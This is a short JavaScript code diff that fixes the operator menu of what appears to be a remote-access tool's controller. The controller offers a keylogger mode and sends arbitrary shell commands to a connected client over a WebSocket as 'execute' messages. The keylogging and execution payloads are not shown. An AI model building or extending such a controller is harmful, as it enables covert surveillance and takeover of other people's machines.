@@ -8,7 +8,7 @@ class HandleClientCommands
     constructor(ws)
     {
         this._ws = ws;
-        this._commandInterface = this._createCommandInterface();
+        this._createCommandInterface();
     }
 
     async menu()
@@ -17,7 +17,7 @@ class HandleClientCommands
         let strQuestion = "";
         for(let option in HandleClientCommands.menuOptions)
         {
-            strQuestion += `Write  ${option} for ${HandleClientCommands.menuOptions[option]}`
+            strQuestion += `Write ${HandleClientCommands.menuOptions[option]} for ${option}\n`;
         }
 
         // Choose what mode to operate in
@@ -28,7 +28,7 @@ class HandleClientCommands
             case "keylogger":
                 this.caseKeylogger();
                 break;
-            case "executing command":
+            case "command":
                 this.caseCommand();
                 break;
             default:
@@ -41,7 +41,7 @@ class HandleClientCommands
         let command = await this._askQuestion("Insert command: ");
 
         this._ws.send(Utils.makeMessage(
-            "keylogger", {command: command}
+            "execute", {command: command}
         ));
     }
 
@@ -70,8 +70,8 @@ class HandleClientCommands
     static get menuOptions()
     {
         return {
-            listen: "keylogger",
-            command: "executing command"
+            listening: "keylogger",
+            command: "command"
         }
     }
 }
